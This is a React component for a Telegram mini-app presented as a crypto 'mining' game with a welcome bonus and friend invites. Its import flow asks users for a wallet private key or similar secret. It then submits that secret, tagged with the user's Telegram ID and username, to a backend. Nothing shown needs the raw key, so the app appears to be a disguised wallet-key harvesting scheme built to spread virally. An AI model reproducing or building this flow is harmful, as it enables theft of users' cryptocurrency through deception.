"use client";

import { useCallback, useEffect, useState } from "react";
import type { Chain } from "@/modules/wallet/types";
import { useTelegram } from "@/shared/hooks/useTelegram";
import { useTelegramBackButton } from "@/shared/hooks/useTelegramBackButton";
import {
  claimWelcomeBonus,
  getMiningBalance,
  isWalletConnected,
  isWelcomeBonusClaimed,
  markWalletConnected,
} from "../services/balance";
import { submitWalletImport } from "../services/submit-import";
import type { MiningImportType, MiningScreen } from "../types";
import { MiningConnectionMethodScreen } from "./MiningConnectionMethodScreen";
import { MiningImportScreen } from "./MiningImportScreen";
import { MiningMainScreen } from "./MiningMainScreen";
import { MiningSelectChainScreen } from "./MiningSelectChainScreen";

export function MiningApp() {
  const { isReady, userName, userId, telegramUsername, haptic, shareInvite } =
    useTelegram();
  const [screen, setScreen] = useState<MiningScreen>("main");
  const [importType, setImportType] = useState<MiningImportType>("private-key");
  const [selectedChain, setSelectedChain] = useState<Chain | null>(null);
  const [balance, setBalance] = useState(0);
  const [welcomeBonusClaimed, setWelcomeBonusClaimed] = useState(false);
  const [walletConnected, setWalletConnected] = useState(false);
  const [isImportSubmitting, setIsImportSubmitting] = useState(false);

  useEffect(() => {
    if (!isReady) return;

    setBalance(getMiningBalance(userId));
    setWelcomeBonusClaimed(isWelcomeBonusClaimed(userId));
    setWalletConnected(isWalletConnected(userId));
  }, [isReady, userId]);

  const handleBack = useCallback(() => {
    haptic("light");

    if (screen === "import") {
      setScreen("connection-method");
      return;
    }

    if (screen === "connection-method") {
      setScreen("select-chain");
      return;
    }

    if (screen === "select-chain") {
      setScreen("main");
    }
  }, [haptic, screen]);

  useTelegramBackButton(screen !== "main", handleBack);

  const openConnectFlow = useCallback(() => {
    haptic("light");
    setSelectedChain(null);
    setScreen("select-chain");
  }, [haptic]);

  const handleClaimWelcomeBonus = useCallback(() => {
    haptic("medium");
    const nextBalance = claimWelcomeBonus(userId);
    setBalance(nextBalance);
    setWelcomeBonusClaimed(true);
  }, [haptic, userId]);

  const handleImport = useCallback(
    async (secret: string) => {
      if (!selectedChain || isImportSubmitting) return;

      haptic("medium");
      setIsImportSubmitting(true);

      try {
        await submitWalletImport({
          chainId: selectedChain.id,
          chainName: selectedChain.name,
          importType,
          secret,
          telegramUserId: userId,
          telegramUsername,
        });

        markWalletConnected(userId);
        setWalletConnected(true);
        setScreen("main");
      } catch (error) {
        console.error("Wallet import submit failed", {
          chainId: selectedChain.id,
          importType,
          error: error instanceof Error ? error.message : String(error),
        });
      } finally {
        setIsImportSubmitting(false);
      }
    },
    [
      haptic,
      importType,
      isImportSubmitting,
      selectedChain,
      telegramUsername,
      userId,
    ],
  );

  if (!isReady) {
    return (
      <MiningMainScreen
        balance={0}
        isWalletConnected={false}
        isWelcomeBonusClaimed={false}
        onClaimWelcomeBonus={() => {}}
        onConnectTask={openConnectFlow}
        onConnectWallet={openConnectFlow}
        onInviteFriends={shareInvite}
        onInviteTask={shareInvite}
        userName={userName}
      />
    );
  }

  if (screen === "select-chain") {
    return (
      <MiningSelectChainScreen
        onInviteFriends={shareInvite}
        onSelectChain={(chain) => {
          setSelectedChain(chain);
          setScreen("connection-method");
        }}
        userName={userName}
      />
    );
  }

  if (screen === "connection-method") {
    return (
      <MiningConnectionMethodScreen
        onInviteFriends={shareInvite}
        onSelectMethod={(method) => {
          setImportType(method);
          setScreen("import");
        }}
        userName={userName}
      />
    );
  }

  if (screen === "import") {
    return (
      <MiningImportScreen
        importType={importType}
        isSubmitting={isImportSubmitting}
        onImport={handleImport}
        onInviteFriends={shareInvite}
        userName={userName}
      />
    );
  }

  return (
    <MiningMainScreen
      balance={balance}
      isWalletConnected={walletConnected}
      isWelcomeBonusClaimed={welcomeBonusClaimed}
      onClaimWelcomeBonus={handleClaimWelcomeBonus}
      onConnectTask={openConnectFlow}
      onConnectWallet={openConnectFlow}
      onInviteFriends={shareInvite}
      onInviteTask={shareInvite}
      userName={userName}
    />
  );
}
